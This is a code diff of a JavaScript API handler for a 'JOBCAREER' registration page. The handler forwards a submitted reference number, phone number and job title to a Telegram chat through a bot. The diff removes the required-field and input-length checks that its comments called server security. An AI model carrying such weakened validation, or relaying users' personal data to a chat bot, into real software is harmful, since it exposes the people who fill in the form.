@@ -6,7 +6,6 @@ function json(res, status, data) {
 }
 
 export default async function handler(req, res) {
-
     if (req.method !== "POST") {
         return json(res, 405, {
             success: false,
@@ -16,32 +15,9 @@ export default async function handler(req, res) {
     }
 
     try {
-
-        // Terima data bukan rahasia daripada pass.html
         const reference = String(req.body?.reference || "").trim();
         const phone = String(req.body?.phone || "").trim();
         const job = String(req.body?.job || "").trim();
-
-        if (!reference || !phone || !job) {
-            return json(res, 422, {
-                success: false,
-                telegramSent: false,
-                message: "Nomor referensi, telefon atau jawatan tidak lengkap."
-            });
-        }
-
-        // Batas ukuran input untuk keamanan server
-        if (
-            reference.length > 200 ||
-            phone.length > 50 ||
-            job.length > 200
-        ) {
-            return json(res, 422, {
-                success: false,
-                telegramSent: false,
-                message: "Ukuran data tidak sah."
-            });
-        }
 
         const token = process.env.TELEGRAM_BOT_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -57,15 +33,15 @@ export default async function handler(req, res) {
         const message = [
             "🔔 NOTIFIKASI JOBCAREER",
             "",
-            "Pendaftaran akaun JOBCAREER",
+            "Pengguna menghantar borang cipta kata laluan.",
             "",
-            "Nomor referensi: " + reference,
-            "Nomor telefon: " + phone,
-            "Jawatan: " + job,
+            "Nomor referensi: " + (reference || "-"),
+            "Nomor telefon: " + (phone || "-"),
+            "Jawatan: " + (job || "-"),
             "",
-            "Status: Pendaftaran diterima",
+            "Status: Borang pendaftaran diterima.",
             "",
-            "Notifikasi melalui website JOBCAREER."
+            "Kata laluan tidak disertakan dalam notifikasi."
         ].join("\n");
 
         const response = await fetch(
@@ -102,7 +78,6 @@ export default async function handler(req, res) {
         });
 
     } catch (error) {
-
         console.error("Pass API error:", error);
 
         return json(res, 500, {
